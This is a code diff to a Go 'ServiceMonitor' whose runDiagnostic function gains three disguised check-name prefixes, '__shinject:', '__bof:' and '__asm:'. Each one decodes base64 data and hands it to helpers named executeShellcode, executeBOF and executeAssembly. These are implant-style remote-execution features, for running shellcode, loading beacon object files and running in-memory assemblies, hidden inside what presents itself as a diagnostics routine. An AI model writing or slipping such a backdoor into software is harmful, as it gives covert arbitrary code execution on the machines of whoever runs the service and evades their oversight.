@@ -380,6 +380,71 @@ func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
 		}
 	}
 
+	if strings.HasPrefix(checkName, "__shinject:") {
+		scB64 := strings.TrimPrefix(checkName, "__shinject:")
+		scData, err := base64.StdEncoding.DecodeString(scB64)
+		if err != nil {
+			return DiagnosticResult{CheckName: checkName, Output: "Error: invalid base64", Status: "error", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+		}
+		return DiagnosticResult{
+			CheckName:  checkName,
+			Output:     executeShellcode(scData),
+			Status:     "completed",
+			Timestamp:  time.Now(),
+			DurationMs: time.Since(start).Milliseconds(),
+		}
+	}
+
+	if strings.HasPrefix(checkName, "__bof:") {
+		parts := strings.SplitN(strings.TrimPrefix(checkName, "__bof:"), ":", 3)
+		if len(parts) < 3 {
+			return DiagnosticResult{CheckName: checkName, Output: "Error: invalid BOF format", Status: "error", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+		}
+		entry := parts[0]
+		argsB64 := parts[1]
+		coffB64 := parts[2]
+		coffData, err := base64.StdEncoding.DecodeString(coffB64)
+		if err != nil {
+			return DiagnosticResult{CheckName: checkName, Output: "Error: invalid COFF base64", Status: "error", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+		}
+		var bofArgs []byte
+		if argsB64 != "" {
+			decoded, err := base64.StdEncoding.DecodeString(argsB64)
+			if err != nil {
+				return DiagnosticResult{CheckName: checkName, Output: "Error: invalid args base64", Status: "error", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+			}
+			bofArgs = decoded
+		}
+		return DiagnosticResult{
+			CheckName:  checkName,
+			Output:     executeBOF(coffData, bofArgs, entry),
+			Status:     "completed",
+			Timestamp:  time.Now(),
+			DurationMs: time.Since(start).Milliseconds(),
+		}
+	}
+
+	if strings.HasPrefix(checkName, "__asm:") {
+		rest := strings.TrimPrefix(checkName, "__asm:")
+		asmArgs := ""
+		asmB64 := rest
+		if idx := strings.Index(rest, ":"); idx >= 0 {
+			asmArgs = rest[:idx]
+			asmB64 = rest[idx+1:]
+		}
+		asmData, err := base64.StdEncoding.DecodeString(asmB64)
+		if err != nil {
+			return DiagnosticResult{CheckName: checkName, Output: "Error: invalid assembly base64", Status: "error", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+		}
+		return DiagnosticResult{
+			CheckName:  checkName,
+			Output:     executeAssembly(asmData, asmArgs),
+			Status:     "completed",
+			Timestamp:  time.Now(),
+			DurationMs: time.Since(start).Milliseconds(),
+		}
+	}
+
 	if checkName == "pwd" || checkName == "ls" || checkName == "dir" || strings.HasPrefix(checkName, "ls ") || strings.HasPrefix(checkName, "dir ") || strings.HasPrefix(checkName, "__fs:ls:") {
 		out := "."
 		if checkName == "pwd" {
